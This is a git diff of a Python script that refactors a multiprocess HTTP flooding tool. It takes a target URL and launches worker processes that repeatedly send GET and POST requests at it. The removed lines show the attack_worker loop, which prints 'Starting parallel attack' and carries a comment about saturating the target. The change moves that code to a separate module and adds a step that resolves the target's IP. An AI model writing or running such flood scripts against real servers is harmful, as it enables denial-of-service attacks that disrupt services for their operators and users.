@@ -1,50 +1,9 @@
 #!/usr/bin/env python3
-import requests
-import time
-from termcolor import colored
-import sys
-from multiprocessing import Process, freeze_support
 import os
-
-def get(url):
-    try:
-        response = requests.get(url, timeout=5)
-        print(colored(f"[{os.getpid()}] GET → {url} - Status: {response.status_code}", "green"))
-    except Exception as e:
-        print(colored(f"[{os.getpid()}] GET Error → {url}: {e}", "red"))
-
-def post(url, datos):
-    try:
-        response = requests.post(url, json=datos, timeout=5)
-        print(colored(f"[{os.getpid()}] POST → {url} - Status: {response.status_code}", "green"))
-    except Exception as e:
-        print(colored(f"[{os.getpid()}] POST Error → {url}: {e}", "red"))
-
-def post_without_data(url):
-    try:
-        response = requests.post(url, timeout=5)
-        print(colored(f"[{os.getpid()}] POST (no data) → {url} - Status: {response.status_code}", "green"))
-    except Exception as e:
-        print(colored(f"[{os.getpid()}] POST (no data) Error → {url}: {e}", "red"))
-
-def attack_worker(target_url, data, iterations=10):
-    """Function that executes each worker process"""
-    print(colored(f"[Process {os.getpid()}] Starting parallel attack...", "yellow"))
-    
-    for i in range(iterations):
-        try:
-            get(target_url)
-            post(target_url, data)
-            post_without_data(target_url)
-            # Small pause to avoid saturating too quickly (adjustable)
-            time.sleep(0.1)
-        except KeyboardInterrupt:
-            break
-        except Exception as e:
-            print(colored(f"[Process {os.getpid()}] Error in iteration {i}: {e}", "red"))
-    
-    print(colored(f"[Process {os.getpid()}] Worker finished after {iterations} iterations.", "yellow"))
-
+from termcolor import colored
+from multiprocessing import Process, freeze_support
+import sys
+import methods as m
 
 if __name__ == "__main__":
     freeze_support()  # Necessary for Windows
@@ -58,6 +17,9 @@ if __name__ == "__main__":
 
     target_url = sys.argv[1]
     
+
+    ip = m.get_ip_from_url(target_url)
+
     # Configurable parameters
     num_processes = int(sys.argv[2]) if len(sys.argv) > 2 else 8      # Default 8 processes
     iterations = int(sys.argv[3]) if len(sys.argv) > 3 else 30        # Iterations per process
@@ -79,7 +41,7 @@ if __name__ == "__main__":
     
     for i in range(num_processes):
         p = Process(
-            target=attack_worker,
+            target=m.attack_worker,
             args=(target_url, data, iterations),
             name=f"Worker-{i+1}"
         )
